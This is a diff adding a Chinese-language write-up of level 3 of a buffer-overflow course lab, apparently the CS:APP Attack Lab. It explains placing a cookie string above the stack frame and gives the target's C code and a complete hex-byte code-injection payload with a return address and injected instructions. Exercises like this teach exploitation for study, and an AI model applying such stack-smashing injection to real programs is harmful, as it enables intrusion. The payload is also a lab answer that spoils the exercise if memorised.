@@ -54,3 +54,40 @@ ec 17 40 00 00 00 00 00
 ```
 
 ![](touch2.png)
+
+## touch_3
+1. 思路与touch_3基本一样，只不过touch_3调用了一个hexmatch()函数，将cookie值解码成ascii字符串(0x59b997fa -> 35 39 62 39 39 37 66 61),我们需要通过injection code将“3539623939376661”存储在touch_3和hexmatch 栈空间接触不到的地方(否则会覆盖我们的字符串)，然后将存储的字符串的地址传递给%rdi, touch_3会把我们存储的字符串与hexmatch生成的cookie值的字符串进行比较，如果相等，touch3就完成了
+2. 只要把字符串存在test 函数高地址空间的位置，这样hexmatch就无法overwrite我们存储的字符串，因为stack都是向更低的地址空间方向开辟新的地址
+```c
+int hexmatch(unsigned val, char *sval)
+{
+  char cbuf[110];
+  /* Make position of check string unpredictable */ 
+  char *s = cbuf + random() % 100;
+  sprintf(s, "%.8x", val);
+  return strncmp(sval, s, 9) == 0;
+}
+void touch3(char *sval)
+{
+  vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) {
+          printf("Touch3!: You called touch3(\"%s\")\n", sval);
+          validate(3);
+      } else {
+          printf("Misfire: You called touch3(\"%s\")\n", sval);
+          fail(3); 
+      }
+  exit(0); }
+```
+```asm
+"level3Instruct.txt" 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+b0 dc 61 55 00 00 00 00
+fa 18 40 00 00 00 00 00
+48 c7 c7 b8 dc 61 55 c3
+35 39 62 39 39 37 66 61
+00 00 00 00
+```
